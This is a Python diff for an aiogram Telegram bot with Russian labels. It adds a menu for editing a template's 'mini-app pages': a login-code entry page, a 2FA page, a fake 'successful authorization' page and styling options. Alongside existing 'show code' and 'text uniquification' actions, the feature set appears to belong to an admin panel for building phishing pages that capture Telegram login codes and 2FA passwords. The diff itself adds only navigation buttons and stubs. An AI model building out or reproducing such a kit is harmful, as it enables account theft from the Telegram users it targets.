@@ -101,7 +101,6 @@ _STD_ROWS: list[tuple[str, str]] = [
     ("Пост админ канала", "admin_post"),
     ("Показ успешной авторизации", "show_auth"),
     ("📋 Показ кода", "show_code"),
-    ("📱 Страницы мини-апп", "pages"),
 ]
 
 
@@ -117,6 +116,11 @@ def _std_kb(bid: int, tid: int) -> InlineKeyboardMarkup:
                 text=label, callback_data=f"std_act:{bid}:{tid}:{act}"
             )
         )
+    b.row(
+        InlineKeyboardButton(
+            text="📱 Страницы мини-апп", callback_data=f"tpl_pages:{bid}:{tid}"
+        )
+    )
     b.row(
         InlineKeyboardButton(
             text="⚡ Уникализация текста", callback_data=f"std_act:{bid}:{tid}:uniq"
@@ -151,6 +155,32 @@ async def _show_editor(callback: CallbackQuery, bid: int, template: dict) -> Non
     await callback.message.edit_text(
         _std_text(template), reply_markup=_std_kb(bid, template["id"])
     )
+
+
+# ---------------------------------------------- страницы мини-апп шаблона
+_PAGE_ROWS: list[tuple[str, str]] = [
+    ("Главная страница", "main"),
+    ("Страница ввода кода", "code"),
+    ("Страница с 2FA", "twofa"),
+    ("Страница успешной авторизации", "success"),
+    ("🖼 Фон", "bg"),
+    ("💨 Блюр фона", "blur"),
+    ("🎨 Цвет интерфейса", "color"),
+]
+
+
+def _pages_kb(bid: int, tid: int) -> InlineKeyboardMarkup:
+    b = InlineKeyboardBuilder()
+    for label, act in _PAGE_ROWS:
+        b.row(
+            InlineKeyboardButton(
+                text=label, callback_data=f"pg_act:{bid}:{tid}:{act}"
+            )
+        )
+    b.row(
+        InlineKeyboardButton(text="⬅️ Назад", callback_data=f"std_open:{bid}:{tid}")
+    )
+    return b.as_markup()
 
 
 # ----------------------------------------------------------------- хендлеры
@@ -228,6 +258,30 @@ async def del_tpl(callback: CallbackQuery) -> None:
     delete_template(tid)
     await _show_menu(callback, bot)
     await callback.answer("Шаблон удалён 🗑")
+
+
+@router.callback_query(F.data.startswith("tpl_pages:"))
+async def open_pages(callback: CallbackQuery) -> None:
+    _, bid_s, tid_s = callback.data.split(":")
+    bid, tid = int(bid_s), int(tid_s)
+    bot = get_bot(bid)
+    if not owns(callback.from_user.id, bot):
+        await callback.answer("Бот не найден.", show_alert=True)
+        return
+    template = get_template(tid)
+    if template is None or template["owner_id"] != callback.from_user.id:
+        await callback.answer("Шаблон не найден.", show_alert=True)
+        return
+    await callback.message.edit_text(
+        f"💎 <b>Страницы мини-апп шаблона «{template['name']}»:</b>",
+        reply_markup=_pages_kb(bid, tid),
+    )
+    await callback.answer()
+
+
+@router.callback_query(F.data.startswith("pg_act:"))
+async def page_action(callback: CallbackQuery) -> None:
+    await callback.answer("🚧 В разработке", show_alert=True)
 
 
 @router.callback_query(F.data.startswith("std_act:"))
